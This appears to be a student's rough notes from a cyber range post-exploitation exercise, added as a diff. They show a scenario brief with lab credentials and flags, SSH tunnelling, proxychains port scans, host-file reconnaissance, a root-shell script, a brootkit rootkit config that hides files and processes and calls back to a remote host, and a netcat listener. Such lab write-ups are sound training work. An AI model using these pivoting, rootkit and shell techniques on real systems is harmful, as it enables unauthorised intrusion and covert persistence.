@@ -1,0 +1,199 @@
+Donovian Post Exploitation (DPE)
+XX Mar 2024
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)
+
+Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.
+
+Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized
+
+Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty
+
+Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.
+
+Scheme of Maneuver:
+>internet_grey_host
+->T1: 192.168.28.100
+--->T3:x.x.x.9
+
+Target Section:
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds: comrade :: StudentMidwayPassword
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+
+---------------------------------------------------
+
+
+
+$ ssh -M -S ~/.ssh/CM/gray -o "ControlPersist=10m" student@10.50.40.200
+ssh -O forward -L2222:192.168.28.100:2222 -S ~/.ssh/CM/gray place
+ssh -M -S ~/.ssh/CM/T1 -o "ControlPersist=10m" comrade@127.0.0.1 -p2222
+
+
+
+To (253)
+
+ssh -O forward -L3333:192.168.150.253:3201 -S ~/.ssh/CM/T1 placer
+ssh -M -S ~/.ssh/CM/T2 -o "ControlPersist=10m" comrade@127.0.0.1 -p3333
+
+ ssh -S ~/.ssh/CM/T2 grayhost
+ 
+ 
+1st question
+eom map 
+
+2nd question
+find / -type f  -name "*inve*"  2>/dev/null
+
+
+ 
+ 
+  ssh -S ~/.ssh/CM/T1 grayhost -D 9050
+
+proxychains nmap -Pn -T4 192.168.28.9 -p 1-10000 --script=banner.nse 2>/dev/null
+
+proxychains nc 192.168.28.9 5985
+(HTTP)
+
+ cat /etc/hosts
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.150.253 Donovian-Intranet
+
+proxychains nmap -Pn -T4 192.168.150.253 -p 1-10000  2>/dev/null
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-11 14:40 UTC
+Nmap scan report for 192.168.150.253
+Host is up (0.0033s latency).
+Not shown: 9997 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+514/tcp  open  shell
+3201/tcp open  cpq-tasksmart  9 ssh ) 
+
+
+
+
+GAIN ACCESS TO 253 
+
+cat /etc/hosts
+
+
+( ON 253)
+ cat /etc/hosts
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.56.1   badguy
+#f1@g = TMncmYEgJtshtFlr6PNk
+
+
+cat rsyslog.d/*
+
+
+ 
+
+
+( GAIN ROOT ACCESS) 
+ #!/bin/bash
+
+echo "LEMME IN" 
+/bin/bash -i
+
+ sudo -i 
+ 
+ 
+ root@lin:~/brootkit/brootkit-master#  cat br.conf 
+#brootkit config file.
+#
+HIDE_PORT		8080,8899
+HIDE_FILE		br.conf,bashbd.sh,brootkit,.bdrc,brdaemon,wzt
+HIDE_PROC		bashbd,brootkit,pty.spawn,brdaemon
+REMOTE_HOST		192.168.215.128
+REMOTE_PORT		8080
+SLEEP_TIME		60
+
+#f1@G = ZAFFsmlNTYkukQJhsthG
+ 
+ 
+
+
+crontab -e
+ to look at cronjobs and suheduled task 
+  (  as root user ) 
+
+
+
+tcpdump -Xxvvvn 'dst  192.168.150.253 && not  port 3201'
+ cd /bin 
+ find ( netcat ) 
+./nc.openbsd -lvp 12303 
+
+root@lin:/bin# ./nc.openbsd -lvp 12303 
+Listening on [0.0.0.0] (family 0, port 12303)
+Connection from 192.168.28.135 58898 received!
+UWRDUHVHVE5JeER4d3VsOXU2dTIK
+
+
+
+----------------------------------------------------------------
+
+
+
+
+Nmap scan report for 192.168.28.9
+Host is up (0.0037s latency).
+Not shown: 9993 closed ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5040/tcp open  unknown
+5985/tcp open  wsman (HTTP)   
+5986/tcp open  wsmans
+47001/tcp open  winrm(HTTP)
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49672/tcp open  unknown
+
+
+
